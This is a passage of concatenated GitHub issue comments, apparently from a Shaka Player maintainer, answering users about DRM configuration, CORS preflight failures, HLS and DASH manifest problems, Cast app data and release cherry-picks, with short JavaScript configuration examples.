serverCertificate parameter.\nTherefore I'm going to fix this in two parts:\n1. Fix the immediate failure in a very simple way, which can be cherry-picked to v2.1.1.  \"serverCertificate\" will be treated like \"abr.manager\" in ConfigUtils, and we will copy it directly, as opposed to recursively.  This means, though, that we will not be checking its type.\n2. Apply a more detailed fix that will only appear in v2.2.  When we refactor ABR configuration for #744, \"abr.manager\" will be removed from the configuration.  This will make it easier to clean up and fix config merging in a way that allows type-checking of serverCertificate as a Uint8Array.\nPart 2 will only be merged after #744 is fixed.. The first part of the fix has been cherry-picked to v2.1.1 and v2.0.9.  The type of the serverCertificate field will not be checked by configure().  Type-checking will be fixed in v2.2.0, as it depends on some refactoring in-progress.. Yes, I would be happy to take a PR for this.  I would also be glad to cherry-pick the fix to v2.1.x.. I looked into this a little as part of #823, which overlaps a lot.  Here's what I found:\n\nTrack ID for variants is taken from Variant ID\nTrack ID for text is taken from Stream ID\nStream and Variant IDs are auto-incremented integers, not from manifest\nswitchHistory contains Stream IDs only\n\nThe crux of the problem is that variant Tracks have the Variant ID, but the two Streams inside the Variant have their own IDs which are only seen in switchHistory and can't be correlated to anything through the public API.. Changing switchHistory to contain variant changes instead of individual audio/video streams would probably suffice.. Cherry-picked to v2.1.3.. Not specifying a robustness should be equivalent to the lowest robustness level, as I understand it.  It is possible that Widevine robustness values are not supported in Firefox yet, in which case someone should file a bug against Firefox.\nThe Widevine CDM should (ideally) work the same on Chrome and Firefox, but Mozilla is responsible for the EME implementation that sits between the CDM and the JavaScript application.  Robustness strings must be checked at that level, before the CDM is instantiated.\nThe Chrome warning about robustness is produced by Chrome itself, and is outside the control of Shaka Player (or any JS app).  As I understand it, that warning was added at a time when EME was considering making robustness required.  The spec as it stands today states of robustness:\n\nThe empty string indicates that any ability to decrypt and decode the content type is acceptable.\n\nBased on that spec text, I believe it is safe to ignore the warning.. Since the Chrome warning is what led us here, I proposed removal of the misleading robustness warning in Chrome: https://bugs.chromium.org/p/chromium/issues/detail?id=720013. Firefox 55 is now the stable release.. The fix for this has been cherry-picked and will be released in v2.1.5.. Hi @surig,\nCan you please clarify what your question is?  You left our issue template completely blank, so all we have to go on is the issue title: \"How to send request from android client or ios\"\nI don't understand what you mean by \"send request\" in this context.  Can you give us some more information on what you're trying to do?. Support for generic sender apps was completed in #722 and first released in v2.1.0.  So this part should be working already.\nTo send parameters from your Shaka-based sender app to the Shaka-based receiver, use this API:\nhttps://nightly-dot-shaka-player-demo.appspot.com/docs/api/shaka.cast.CastProxy.html#setAppData\nFor example, in the sender:\n```js\nplayer = new shaka.Player(videoElement);\ncastProxy = new shaka.cast.CastProxy(videoElement, player, receiverAppId);\ncastProxy.setAppData({\n  anythingYouWant: { noWrongAnswers: true },\n  thisIsAFreeFormObject: \"containing whatever extra information you want to send.\",\n  authToken: \"foo\",\n});\n// Do not use setAppData for the license URL or manifest URL:\ncastProxy.getPlayer().configure({\n  drm: {\n    servers: {\n      \"com.widevine.alpha\": licenseServerUri\n    }\n  }\n});\ncastProxy.getPlayer().load(manifestUri);\n```\nConfiguration and manifest URI will be proxied automatically to the receiver, but this mechanism can't transmit functions or callbacks, such as request filters.  Instead, pass your auth tokens via setAppData() and set up those callbacks in your receiver:\n```js\nplayer = new shaka.Player(video);\nreceiver = new shaka.cast.CastReceiver(video, player, onAppData);\nfunction onAppData(appData) {\n  console.log('App Data:', appData);\n  player.getNetworkingEngine().clearAllRequestFilters();\n  player.getNetworkingEngine().registerRequestFilter(function(type, request) {\n    if (type != shaka.net.NetworkingEngine.RequestType.LICENSE) return;\n    request.headers['MyAuthHeader'] = appData.authToken;\n  });\n}\n```\nDoes this answer your question?. Closing due to inactivity.  If you need any more help with this, please let us know and we can reopen.. Hi @pszemus,\nThis piece of content has a video codec of \"avc1.4d001f\" (aka h.264) and an audio codec of \"mp4a.40.34\" (aka mp3).  This video codec is supported by the browser, but the audio codec is not.\nIn v2.0, our internal model kept video and audio separate.  So in v2.0.x, this plays as a video-only clip.\nIn v2.1, we changed to a model in which video and audio combinations are modeled as variants.  In this model, none of the variants in your content are playable, because all variants use an audio codec that is not supported by the browser.\nI don't think it makes sense for us to play in video-only mode or audio-only mode for content that is clearly meant to have both video and audio.  What do you think?. Thanks.  We will consider it.. @pszemus, I have discussed this issue with our product managers, and we have decided not to pursue support for video-only playback in content that contains an audio stream.  If content contains audio, ignoring the audio without throwing an error would not be a desirable user experience.  The same is true of content which contains unplayable video.  Ignoring the video stream while playing audio-only would not make sense for the end user.\nI apologize for any inconvenience this causes you.. Thanks for the report.  Looks like our xlink commit broke IE & Edge.  Our build bot is complaining as well, which is good news.  Should be easy to chase down.. I updated the nightly build early, so you should see the fix there now.  Thanks again for the report!. @ut0mt8, can you please provide some additional information so we can assess the problem?\n\nCan you reproduce the issue with our latest release version?\nCan you reproduce the issue with the latest code from master?\nAre you using the demo app or your own custom app?\nIf custom app, can you reproduce the issue using our demo app?\nWhat did you do?\nHow did you interact with the content, if at all?\nWhat did you expect to happen?\nWhat actually happened? (Please include error messages/codes). I'm sorry it took so long to get to this issue.  I tried your manifest and got a 404 error from your server.  Do you have an updated link for us?. Here's a short link for convenience while testing this content: https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://ec2-52-56-93-145.eu-west-2.compute.amazonaws.com/app/live/index.mpd\n\nI'm getting a mixed-content error while trying to fetch your time sync file as specified by UTCTiming:\n\nMixed Content: The page at 'https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://ec2-52-56-93-145.eu-west-2.compute.amazonaws.com/app/live/index.mpd;lang=de' was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint 'http://52.56.93.145/static/time.txt'. This request has been blocked; the content must be served over HTTPS.\n\nThat's one thing you'll need to fix on your end.  You can't load an HTTP resource inside of an HTTPS page. (When I fetch the time sync file manually, the Date header seems to be accurate.)\nYour segment references seem to disagree with your availabilityStartTime and timeShiftBufferDepth attributes.  This is the reason your content does not play.\nAt the time I fetched the manifest, according to availabilityStartTime, the presentation times available should have been 37,616 through 38,264 (seconds). <SegmentTimeline>, though, says the most recent segment was time 2,662,171 - 2,662,174 (seconds). This is an apparent desynchronization of 2,623,910 seconds, or about 30 days.  This is a suspiciously round number.  I would recommend you check the clock on your server or encoder.\nWhat encoder are you using?  Have you checked for an update?. Shaka Player v2 is more strict than v1 about the presentation timeline.  In v1, we tried to handle content which is out of spec, but this ultimately led to subtle bugs and difficulty in maintenance.\nYour segment times do not agree with the presentation timeline.  I would be happy to help you with a report to Elemental.  Ultimately, this is a bug in their encoder.. As discussed offline, let's use the newly-added videoCodec field of Track to identify variants with video.. This fix was just released in v2.1.2.. Makes sense to me.  I'll tentatively schedule it for v2.2, but it is lower priority than bug fixes and HLS work.  We will try to come up with a design first, publish a design doc, then implement.. In #886, @hghazzi asks to know which Player instance cues came from.  I've marked that as a duplicate and I'm adding a requirement here that there should be some way to know which Player instance is associated with the display instance.\nIf the text display factory is configurable per-player (as opposed to some global registration), this requirement could be met by the application itself.  This is a very lazy example of what I mean, and does not reflect the final interface being designed by @ismena:\njs\nplayer.configure({\n  textDisplayFactory: function() {\n    return new MyCustomTextDisplay(player);\n  }\n});\nThen, any call the Player makes to new config.textDisplayFactory() will create an instance of MyCustomTextDisplay which knows exactly which Player instance it belongs to.. @hghazzi, we will be releasing v2.2.0 as soon as #960 is resolved.  I estimate that this may take another week or two, but it is difficult to say for certain.  Sorry for the long delays.. @hghazzi, we have now closed all the issues we had planned for v2.2.0.  Once we take some extra time for QA, we will release v2.2.0.  Thanks!. @tdaines, can you please email us a link to the content?  We need to be able to reproduce the issue before we can work on a fix.  You can find my email address in the CONTRIBUTORS file.  Thanks!. There is definitely a bug here.  I was able to reproduce your issue, but the fix led me to uncover some related issues which are more complicated.  I'm still working through them.\nAt the top-most layer, you are right.  We are effectively ignoring this request to change language, and this is caused by the fact that we choose streams for the period we are playing, then compare these to the period we are streaming.  This comparison was easy to fix, but it uncovered issues with StreamingEngine which I don't fully understand yet.\nThanks for your patience.. The MSE spec does not guarantee support for multiple video SourceBuffers or multiple audio SourceBuffers at the same time, and we have never experimented with adding and removing SourceBuffers during playback.  Your mileage may vary.. You will never be required to set a certificate.  If you do not set one, the Widevine CDM will provision one automatically.  Setting one explicitly is an optimization to save you the extra round trip and the extra server traffic.. @hdodev, this is a CORS issue (Cross-Origin Resource Sharing).  This is a very common source of confusion for developers.  We even have a label for it in our issue tracker now.\nThe OPTIONS request is made automatically by the browser, and it's called a preflight request.  In essence, it's asking the server for permission to make the actual request.\nThe browser is enforcing these CORS rules to prevent someone from inserting malicious code into a page that then contacts a third-party server.  Any request that goes \"cross-origin\" (from a page in one domain to a server in another) is subject to CORS rules and restrictions.\nWhen you added a custom header to the license request, this triggered the CORS preflight request.  The server must be able to respond to the OPTIONS request with the following headers:\nAccess-Control-Allow-Origin: foo.example.com\nAccess-Control-Allow-Headers: authorization\nAccess-Control-Allow-Origin indicates that your page is allowed to talk to that server.  The server can respond with * instead of the domain name to indicate that any origin is permitted.\nAccess-Control-Allow-Headers indicates that your page is allowed to send those custom headers to the server.\nIf you don't control the license server, you can ask the owners of the license service to make it CORS-friendly and refer them to this post for reference.  If they have questions about implementing CORS, I am happy to answer them.\nDoes this help?. Yes, both of those are CORS issues.\nTo allow access on 127.0.0.1, you would have to either add an additional header like so:\nAccess-Control-Allow-Origin: http://127.0.0.1\nOr change the origin to a star:\nAccess-Control-Allow-Origin: *\nEither would work.\nThe license request issue is that the server returns an error when the browser makes a pre-flight request.  HTTP 405 means \"method not allowed\".  This would indicate that the server doesn't support CORS pre-flight requests at all (which use the OPTIONS method).. EME requires https starting in Chrome 58.  Chrome makes an exception for localhost, since that is considered a \"secure context\".  For more information, see https://github.com/google/shaka-player/issues/736#issuecomment-289104405\nDoes this help?. Glad we could help!. Clearly, we should add MediaSource.isTypeSupported to the APIs we check for in isBrowserSupported().\nWhat version of Opera are these TVs based on?  I'm wondering if we could polyfill the missing functionality.. According to http://caniuse.com/#search=mediasource (click \"show all\" to see Presto versions of Opera), there is no MediaSource support in Presto (Opera 12 and under).\nUnfortunately, Shaka Player only works with MediaSource.  As far as I know, it is infeasible to polyfill MediaSource as a whole.. Since there is no way for us to support Presto without MediaSource, I am going to close this issue.  If you disagree, I'm happy to discuss any alternatives you might have in mind.. Codec information is required in HLS because we've always been able to expect manifests to provide that information.  It seems reasonable to make some basic assumptions about HLS, though, if the information is often omitted.\nYou said \"trying to load standard m3u8\".  Can you provide a link?  It will be much easier to diagnose if we can see the manifest and reproduce the error.\nI also noticed that you wrote LINK_TO_TS_FILE_HERE in your sample manifest.  Keep in mind that for MediaSource-based playback, the browser has to support both the codecs and the container format.  Last time I checked, only Safari, Edge, and Chromecast support TS.. You can find my email address in the CONTRIBUTORS file to send me a link privately.\nContrary to what you are saying about TS, it is not supported in Chrome.  You can see the results of a MediaSource probe by visiting https://shaka-player-demo.appspot.com/support.html in the browser of your choice.  In Chrome, for example, you'll see this line:\n\"video/mp2t; codecs=\\\"avc1.42E01E\\\"\": false,\nWhen queried for MPEG 2 TS support, Chrome reports that it is not supported.\nWhile MP4 is supported by every major browser (Chrome, Firefox, Edge, IE11, Safari, Opera, Chromecast), you will find that TS support is much more limited (Edge, IE11, Safari, Chromecast).  I do not have any data on TV platforms.. HLS with TS should work in Shaka Player in browsers (or TVs) that support TS via MediaSource.  The code to recognize TS in HLS is already in Shaka Player.  We don't transmux it to mp4 on platforms that don't support it, so you should not expect TS to be supported on Chrome, Firefox, or Opera.\nI will look at the manifest you sent me and we can add sensible defaults for codecs.. Does it work in Microsoft Edge?. You may be running into this: https://github.com/google/shaka-player/issues/743. I have looked at the HLS manifest you sent, and there are several issues preventing playback.  Here's a sanitized version of what's in the manifest, for the sake of documenting what we're doing:\n```\nEXTM3U\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=479232,RESOLUTION=480x256\nhttp://foo.bar/1/index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=154624,RESOLUTION=480x256\nhttp://foo.bar/2/index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=248832,RESOLUTION=480x256\nhttp://foo.bar/3/index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=674816,RESOLUTION=480x256\nhttp://foo.bar/4/index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=1011712,RESOLUTION=640x352\nhttp://foo.bar/5/index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=1317888,RESOLUTION=848x480\nhttp://foo.bar/6/index.m3u8\nEXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=56320,CODECS=\"mp4a.40.2\"\nhttp://foo.bar/7/index.m3u8\n```\nThese are the main issues with this in today's Shaka Player:\n  1. No CODECS attribute in most EXT-X-STREAM-INF tags\n  2. Video+Audio variants use multiplexed streams (which we do not currently assume)\n  3. Audio-only variant is not multiplexed (so assuming multiplexed everywhere would be a mistake)\nThe manifest appears to come from Kaltura, so I will also reach out to them and ask if they can add more information to these playlists in a future version of their product.  From the HLS spec:\n\nEvery EXT-X-STREAM-INF tag SHOULD include a CODECS attribute.\n\nIn the mean time, there are a few things we can do to better infer the content characteristics:\n\nIf there is an AUDIO attribute pointing to audio streams, assume the stream contains video only.\nIf there is a VIDEO attribute pointing to video streams, assume the stream contains audio only.\nIf there is a RESOLUTION attribute, assume the streams contains at least video.  If there is no AUDIO attribute, it may also contain audio muxed in.\n\nThe spec also states:\n\nIf an EXT-X-STREAM-INF tag or EXT-X-I-FRAME-STREAM-INF tag contains the CODECS attribute, the attribute value MUST include every media format [RFC6381] present in any Media Segment in any of the Renditions specified by the Variant Stream.\n\nSo we will assume that a single codec string means the content is not multiplexed.. @itaykinnrot, can you point me in the right direction to file a feature request on Kaltura?  See my comment above for context.. This fix was just released in v2.1.2.. Thank you for confirming.  We can discuss Safari TS issues further on #743.. I'm so sorry, but we are no longer maintaining v1.6.x.  v1.6.5 came out 11 months ago.  v2.0 came out 8 months ago, and we've made 11 more releases since then.  The latest release is v2.1.1.\nMy team is just too small to continue maintenance on such an old release.  I apologize for the inconvenience.\nWhat packager are you using?  Have you updated to the latest version of that packager?  If you can send us a manifest URL (publicly or privately), we can test it in v2.1 and help assess what is wrong with the content.  Perhaps we can recommend fixes for your packager.. We can't use an attached mpd to test playback.  Can you provide a live URL?  You can email it to me privately if you don't want to share publicly.  My email address is in the CONTRIBUTORS file.. I believe so, yes.  You'll need to provide instructions on how you want us to use the cookie to authenticate to the license server.  Thanks!. Thanks @MegaLabs1.  I have not had time to look at this yet.  I apologize for the delay.. @MegaLabs1, I have checked the content, and it appears that the clock sync is way off.  The segments referenced by <SegmentTimeline> do not match the MPD's availabilityStartTime attribute.\nAt the time I fetched the manifest, according to availabilityStartTime, the presentation times available should have been 3,953,587 through 3,953,651 (seconds).  <SegmentTimeline>, though, says the most recent segment was time 3,979,130 - 3,979,138 (seconds).  This is an apparent desynchronization of 25,487 seconds, or about 7 hours.  Because this is a round number of hours, this sounds like a timezone issue.\nWall clock times in the manifest (such as availabilityStartTime) should be in UTC according to spec.  Please make sure your server timezone is configured correctly and that the times in the manifest are in UTC.. @kuznetcoff777, is this related to the original issue in this thread?\ngetPlayheadTimeAsDate() converts the playhead time (presentation time) to the corresponding wall clock time and returns a Date object.\nFor example, assume a presentation starts at presentation time 0 and began streaming at midnight on Jan 1, 2017, UTC.  If the current presentation time under the playhead is 3600 (1 hour into the presentation), then getPlayheadTimeAsDate() would return a Date object corresponding to 1 AM, Jan 1, 2017, UTC.\nDoes that answer your question?. @kuznetcoff777, please file a new issue or write to the mailing list instead of adding unrelated comments to this issue.  Thanks!. After careful review, we have determined that the typo is in the documentation for shakaExtern.Stream and shakaExtern.Track.  Those refer to \"captions\" and \"subtitles\", even though the constants used are \"caption\" and \"subtitle\".\nI understand that it is a little confusing to have constants named very similarly to the <track> element attribute names, but the constants in shakaExtern.Track and shakaExtern.Stream are never applied to the kind attribute in <track>.\nTo summarize:\n - The Shaka Player API uses subtitle and caption.\n - DASH manifests use subtitle and caption.\n - HLS manifests use subtitles.\n - HTMLTrackElement uses subtitles and captions.\nWe will take this as a docs bug and correct the typos in the externs.  Thank you for the report!. This fix was just released in v2.1.2.. @TigerHuang, are you able to reproduce your issue on the nightly build?. There are still reasons to request it from the server without letting the CDM do it.  The CDM will do it once per session, as opposed to once per page load.  Setting it in advance can also reduce playback latency for content that does not have a clear lead.. That all looks reasonable to me, but perhaps @TheModMaker will spot something I missed.\nThe error message is based on the fact that the browser/CDM rejected the data you provided.  So I can only assume it's not the correct data in some way.\nIf you can send us the exact license.bin file, we could probably tell you if it's malformed in some way.  If you share the URL of that file with us, we could probably also tell you if there is some server issue that's corrupting the file.  You may find our emails in the CONTRIBUTORS file if you don't want to share these things publicly.. Thanks.  We will go through those same steps, but that may not help if you made a mistake on your end.  If you send us the exact file you are serving and/or the URL for that file on your server, we can compare that file with ours and tell you if your copy is corrupt somehow.. Glad I could help!. @hghazzi, what error code do you get with the cert you sent via email?. @hghazzi, I am able to play with your certificate, so there's nothing wrong with the contents.  Perhaps you are fetching it wrong?\nIf you are using XHR to fetch the cert, make sure you are using responseType = 'arraybuffer'.  See the MDN article \"Sending and Receiving Binary Data\" for more details.\nIf you are using Shaka's NetworkingEngine to make the request, you will already get back an ArrayBuffer.\nShaka Player config wants a Uint8Array, so use something like new Uint8Array(certBuffer) for the value you pass to Shaka's DRM configuration.\nHere's an example using NetworkingEngine:\n```js\nvar requestType = shaka.net.NetworkingEngine.RequestType.APP;\nvar request = { uris: [ '810.cert.bin' ] };\nvar async = shakaDemo.localPlayer_.getNetworkingEngine().request(requestType, request);\nasync.then(function(response) {\n  var cert = new Uint8Array(response.data);\n  console.log('cert fetched', cert);\n// This config affects future calls to player.load()\n  player.configure({\n    drm: {\n      'com.widevine.alpha': { serverCertificate: cert }\n    }\n  });\n});\n```. @hghazzi, it seems like you have a bug in your proxy.  Unfortunately, I can't really offer proxy support here.. I'm using the demo license server in our demo app: https://widevine-proxy.appspot.com/proxy. @itaykinnrot, can you provide us with some idea of what this feature is?  You didn't put a description in the PR.. @erankor, thank you for the context, particularly on HLS.  It makes perfect sense.  I filed #825 to follow up on the HLS NAME attribute.. Thank you for your contribution!. Cherry-picked to v2.1.3.. Hrm... that's odd.  It's not clear to me why this duplicate init data would be needed.  Duplicate init data leads to duplicate license requests (and therefore extra license server traffic), duplicate sessions (and therefore extra resource consumption in DRM hardware), and (normally) no effect on playback.  So we're strongly inclined to filter this out.\nI recognize that an option would solve the problem without affecting other browsers, but it would require UA detection in every app to set it correctly.\nPlus, I am still skeptical of Tizen's behavior.  If this is a quirk of Tizen's EME implementation that requires multiple sessions for the same keys, I would really like to understand more about it before we act.. Thank you!  I hope we hear from them, one way or the other.. Based on our private email exchange, I believe this is a bug in Samsung's EME implementation.  I don't believe we could work around this without creating duplicate sessions and generating extra traffic for the license server.  This is something I would prefer to avoid.  It would be preferable for Samsung to fix the platform.. Thank you for contributing!  I will review your PR soon.\nI am happy to help you with Tizen issues if I can.  Unfortunately, I don't have access to a Tizen device for testing.\nPlease do file an issue with details on what goes wrong in compiled mode.  When there are issues in compiled mode, the compiler is usually renaming something it should not.  We can definitely help you fix that.. I admit, I'm not familiar with the distinction.  But we'll try to do what we can to help, either way.. This fix was just released in v2.1.2.. Thank you very much for your contribution!. Looks good to me!  I'll run tests on the build bot.. This fix was just released in v2.1.2.. Shaka Player does not support playing an mp4 directly.  We do support unprotected mp4, but only through some manifest, like DASH or HLS.  For direct playback of mp4, just set video.src = 'foo.mp4'.  You don't need Shaka Player for that.. Plain HTML5 playback sounds like the best solution for your problem.  I'm not sure Shaka Player could add any value.  If there's no encryption, no adaptive streaming, and no manifest, there's nothing left for Shaka to do.\nIf you disagree, I would be happy to discuss it further.. It can't, though, with the current architecture.  I promise, it's not just stubbornness on my part.  :-)  Shaka Player today is a MediaSource-based player.  With MediaSource, the application fetches content and feeds it into a SourceBuffer to be consumed by the browser's media stack.  This is fundamental to Shaka's v2 design.\nWhat you can do, if you want to use Shaka Player for some playbacks and not others, is switch off:\n```js\nvar player = new shaka.Player(video);\nplayer.load(manifestUri);\n// ... time passes ...\nplayer.destroy()\nvideo.src = directPlaybackUri;\nvideo.load();\n// ... time passes ...\nplayer = new shaka.Player(video);\nplayer.load(anotherManifestUri);\n```\nIf you want to avoid destroying and recreating the player, another solution would be to have multiple video tags.  Not all platforms support multiple video tags, but some bolt-on ad SDKs do something like this:\n```js\nvar player = new shaka.Player(video1);\nplayer.load(manifestUri);\n// ... time passes ...\n// Switch!\nplayer.unload();  // Or video1.pause(), if you want to resume the same content later\nvideo1.style.display = 'none';\nvideo2.style.display = 'inline';\nvideo.src = directPlaybackUri;\nvideo.load();\n// ... time passes ...\n// Switch!\nvideo1.style.display = 'inline';\nvideo2.style.display = 'none';\nplayer.load(anotherManifestUri);  // Or video1.play(), if you want to resume\n```\nFinally, you could consider serving ads via DASH.  Shaka Player supports multi-period DASH content, which is (as far as I can tell) perfect for ads.  Shaka uses MediaSource to stitch the ads together with the main content into a seamless presentation.\nDo any of these suggestions help?\nShaka Player v1 had a mechanism for src= playback, so it is definitely possible for one player to do both.  We removed that mechanism in v2 because it complicated our design, it was hard to maintain, and it was only rarely used.\nIf we were to add something like that back, we would need a better design and a strong justification for the effort.  If I understand you correctly, you want to use the same player for DASH and direct MP4 playback.\nFor direct MP4 playback (hypothetically):\n\nShaka's networking and streaming logic would be out of the picture, because the browser would be fetching the content\nShaka's MediaSource engine would be out of the picture, too, because the browser's media stack would be fed internally\nShaka's manifest parsers would be out of the picture, because there's no manifest\nShaka's DRM engine would be out of the picture, because the content is unencrypted\nShaka already does not have any APIs for seeking, pausing, etc, because those things happen on the video element\n\nLooking at the architecture diagram, I don't see what's left for us to do for you in such a scenario.\nWhat am I missing?  How can Shaka Player make things any easier for you in this case?. We've decided to work on src= support in v2.3.  This will involve a fair amount of refactoring, and using src= to directly play a media file will mean that most of Shaka Player's configuration will have no effect.  The browser will be responsible for streaming, buffering, etc.  Side-loaded captions would also fail (because we would not be streaming text, either).  Shaka Player would only be able to control DRM for src= playback.\nSo, with all those caveats, we are scheduling this for v2.3.. Here's a link that autoplays your content:\nhttps://shaka-player-demo.appspot.com/demo/#asset=https\u200b://sgpoolzml.mmdlive.lldns.net/sgpoolzml/64694878a06c4a02b724ed01d786f31a/manifest.mpd;play\nThe error message says:\n\nShaka Error NETWORK.UNSUPPORTED_SCHEME (https%E2%80%8B://sgpoolzml.mmdlive.lldns.net/sgpoolzml/64694878a06c4a02b724ed01d786f31a/manifest.mpd)\n\nNote that the URL scheme is https%E2%80%8B.  A quick Google search shows that those extra bytes are UTF-8 for a zero-width space character.\nDoes that character appear somewhere in your manifest?. @yuenghole, since the manifest has been taken down, can I assume you have found and fixed the issue on your side?. Closing due to inactivity.  Let us know if you need to reopen it.. @avelad, can you help us understand more specifically what you want in terms of behavior?\nDo you want us to add the .hardware variant to probeSupport()?\nDo you want us to try .hardware in DrmEngine before trying without?  (I recently heard from Microsoft that .hardware should not always be preferred, since some hardware implementations have a smaller feature set than software implementations.)\nDo you want some configuration for this?. I will experiment with this a little and let you know what we can do.  Adding to probeSupport() is trivial, but may not be sufficient to make this variant of the key system ID usable.. Here's one possible solution:\nTo request that we use com.microsoft.playready.hardware specifically, use that instead of com.microsoft.playready in your DRM config when you specify a license server.  We will fail to play if that is not available.\nA better solution would be to use robustness settings in the advanced DRM config.  But I am not familiar with the specific robustness values Microsoft Edge supports.  I will experiment with this a little.. Edge does not seem to support robustness correctly.  I filed a bug about this: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/12133118/\nWe could work around that bug, though.\nThe bigger issue with using robustness is that I am unable to guess which robustness strings are valid for Edge/PlayReady.  I tried these with no luck: 1000, 2000, 3000, SL1000, SL2000, SL3000.\n@avelad, do you know what Microsoft considers valid robustness values?  I asked in the bug I filed, but it may be some time before I get a reply.. We will consider this in our next round of planning.  Right now, v2.5 is quite full, and we will likely have to cut some features from that list to make our deadlines.. In the mean time, we are happy to have someone in the community look into it and provide some suggestions on how it could be achieved, then work on a PR to that end.  Thanks!. So that we can fully reproduce, can you please provide a license server URL.  Restrictions are based on the license, so the specific license server matters.  Thanks!. Let's split the caption ordering into a separate bug report.  Here we will deal with the more severe issue of an API failing in compiled mode.. Even in uncompiled mode, the error is easily reproducible on the nightly and in v2.1.2:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=//ams-samplescdn.streaming.mediaservices.windows.net/11196e3d-2f40-4835-9a4d-fc52751b0323/TearsOfSteel_WAMEH264SmoothStreaming720p.ism/manifest(format=mpd-time-csf);play\nAssertion failed: Inconsistent active stream\nUncaught exception in event handler TypeError: Cannot read property 'language' of undefined\nIt does not reproduce in v2.0.9.. We broke this in 6b6bfb71a3c92d751691886d2b4b42d3a896b9a6. Let's unpack several issues mentioned here.\nException in addTextTrack\nThe exception you get (\"tb[b]\" etc), is caused by you passing the wrong MIME type.  \"text/ttml\" is not the official MIME type of TTML, so our parser is not selected.  Please use \"application/ttml+xml\" instead.\nDisplay order for overlapping cues\nWe don't control this directly.  Cues are displayed by the browser.  I've split this into #848.\nException in demo app\nThere is an exception in the demo app UI that prevents the UI from being updated correctly with the list of tracks.  This is caused by an unexpected situation in which text tracks exist, but none are marked as \"active\" tracks when we hit shakaDemo.updateLanguageOptions_().  This is triggered by the Tears of Steel demo link above.\nI thought this was the same error as the addTextTrack() exception in the original report, but it is not.  There is also no difference here in compiled/uncompiled mode.\nIf we fix this exception in the demo, the UI is populated correctly and the text tracks can be manually selected, but none is selected for us by the player.  So this doesn't really fix the root of the problem, which is that the Player fails to select the newly-added tracks.\nThis regression started in 6b6bfb71.. @yuenghole, please use the issue template so that we can get all the information we need to reproduce your issue and help you.  Here is the template again, for your convenience:\n\n\nWhat version of Shaka Player are you using?\n\n\nCan you reproduce the issue with our latest release version?\n\n\nCan you reproduce the issue with the latest code from master?\n\n\nAre you using the demo app or your own custom app?\n\n\nIf custom app, can you reproduce the issue using our demo app?\n\n\nWhat browser and OS are you using?\n\n\nWhat did you do?\n\n\nWhat content did you load?\n\n\nIf standard demo asset, which one?\n\n\nIf custom asset, what manifest and license server URIs?\n\n\n\n\nHow did you interact with the content, if at all?\n\n\nWhat did you expect to happen?\n\n\nWhat actually happened?\n. Thanks for letting us know!. @russitto, the expectation was that applications would correlate id with the id field of Track.\n\n\nWould it be more helpful to include the Track object itself and deprecate id in the history?. Ah, I see now.  We put IDs from the non-public Stream object into the history, rather than Track IDs.  Sorry about that..  - Track ID for variants is taken from Variant ID\n - Track ID for text is taken from Stream ID\n - Stream and Variant IDs are auto-incremented integers, not from manifest\n - switchHistory contains Stream IDs only\nThe crux of the problem is that variant Tracks have the Variant ID, but the two Streams inside the Variant have their own IDs which are only seen in switchHistory and can't be correlated to anything through the public API.. It looks like the ID issue was already filed here: #785  (edit: corrected issue number). If the IDs in switchHistory matched Track IDs, would that be sufficient?  Or would you still like to have bandwidth added to the history entries?\nI'm starting to lean away from including the entire Track, but that is still a technically feasible option.. In that case, this is a duplicate of #785.  I will close this one, and you can follow along on that one.  Thanks!. Cherry-picked to v2.1.3.. The fix for this has been cherry-picked and will be released in v2.1.5.. After we land PR #811, we will have all the necessary framework to expose labels.  After that, adding support for HLS's NAME attribute will be quick and simple.\nAs for when it will be released, if you want to work with what's in the master branch, you'll have it much sooner.  We will have to review the feature to decide if it makes the cut for v2.1.x or if it waits until v2.2.0.  We try not to cherry-pick anything to a release branch that may introduce undue risk.\nI'll update this issue when the decision is made.. Cherry-picked to v2.1.3.. Sounds good to me.  And the spec is more clear than the corresponding feature in DASH.  :-). What I mean is that you changed the API for SchemePlugin, but you did not update the signatures of all SchemePlugin implementations.  Can you please update the parameters for the data URI scheme (lib/net/data_uri_plugins.js), the offline scheme (lib/offline/offline_scheme.js), and the test scheme (test/test/util/test_scheme.js)?\nIt would also be really helpful if you could demonstrate the usefulness of this extra progress info.  You mentioned using it to provide a progress bar in the buffering state.  Can you modify the demo app (demo/*) to do that?. I really like the idea of showing the user a meaningful progress bar while buffering.  When I test your implementation, though, I find that the progress bar jumps backward noticeably when I limit my network speed.  I worry that a progress bar that moves backward would be confusing.\nIf the goal is a progress bar, perhaps there is another way we can accomplish this.\nInstead of the NetworkingEngine dispatching progress to the application, what if it dispatched progress for segments to StreamingEngine?  StreamingEngine has the context of segment references, buffering goals, etc., and could produce a more meaningful progress indicator (content fetched, sub-segment resolution) to the application.. I'm sorry, but we are not keeping up with pull requests very well at the moment.  I promise to come back to this as soon as I can make the time.  Please accept my apologies for keeping you waiting so long.. With #1051, the progress infrastructure supports an important feature within the library, as opposed to serving progress events up to the application.  Again, our apologies for losing track of this PR.. Note: @theodab has discovered that Fetch is missing timeout/abort functionality that would bring it to parity with XHR.  This means we will not always be able to use Fetch.\nSee whatwg/fetch#20 and whatwg/fetch#447.. Thanks for the update!. Chrome implementation bug: https://bugs.chromium.org/p/chromium/issues/detail?id=750599\nIt looks like some or all of the implementation of AbortController landed in Chrome early this week.  I haven't talked to Chrome team to confirm, but I expect it would launch in Chrome 66, due out in late April.. This feature will be out in v2.4 this week.. Cherry-picked to v2.1.3.. Did we miss text tracks in the previous PR?  This one looks good, so I'll run it through the build bot.  Thanks!. Thanks!. Cherry-picked to v2.1.3.. Cherry-picked to v2.1.3.. Yes, we only support the latest stable release of Edge.  We would consider support for older versions if you send a PR, but we don't have the time or resources to test all versions.\nClosing for now, but we can continue to discuss a PR if you have the time or inclination to contribute.  Thanks!. We have no plans to polyfill 